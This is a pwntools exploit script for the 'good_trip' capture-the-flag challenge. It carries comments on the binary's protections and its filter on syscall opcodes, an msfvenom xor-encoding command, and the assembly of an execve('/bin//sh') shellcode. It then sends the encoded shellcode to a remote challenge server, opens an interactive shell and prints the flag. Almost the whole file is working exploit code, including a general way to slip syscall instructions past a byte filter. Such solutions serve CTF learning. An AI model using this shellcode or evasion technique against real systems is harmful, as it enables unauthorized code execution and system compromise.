from pwn import *
# fill in binary name
elf = context.binary = ELF("./good_trip")
# fill in libc name
# libc = ELF("./libc.so.6")

"""
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

    Global vars filter out: 
    1) 0F 05
    2) 0F 34
    3) CD 80

Vulnerability:
- We can enter 2457 bytes of bytecode, filter scans the first 4093 bytes
- The code size we enter determines how many bytes change from RWX permission to RX permission (we can just put 0 LOL)
./msfvenom -a x64 --platform linux -e x64/xor -f c < /mnt/c/Users/chiae/Downloads/akasecctf24/good_trip/shellcode.bin

Unencoded payload:
    mov rsp, 0x1337131800	
    xor 	rsi,	rsi			
    push	rsi				
    mov 	rdi,	0x68732f2f6e69622f	 
    push	rdi
    push	rsp		
    pop	rdi				
    mov 	rax, 59
    xor rdx, rdx					
    syscall
"""

if args.REMOTE:
  # fill in remote address
  p = remote("172.210.129.230", 1351)
else:
  # p = elf.process(env = {"LD_PRELOAD": libc.path})
  p = elf.process()

# create exploit here
p.sendlineafter(b"size >> ", b"0")
payload = b"\x48\x31\xc9\x48\x81\xe9\xfb\xff\xff\xff\x48\x8d\x05\xef\xff\xff\xff\x48\xbb\x63\xf1\xde\xe5\xa7\xa1\x9a\x8a\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x2b\x4d\xde\xfd\xb4\x96\x89\x8a\x63\xf1\x96\xd4\x51\xf7\xd2\x35\x4c\x93\xb7\x8b\x88\x8e\xe9\xe2\x34\xa5\x81\xad\x60\x61\xa1\x8a\x63\xf1\x96\xd4\x75\xae\x9f\x8a"
# pause()
p.sendlineafter(b"code >> ", payload)
p.interactive()
# AKASEC{y34h_You_C4N7_PRO73C7_5om37hIn9_YoU_doN7_h4V3}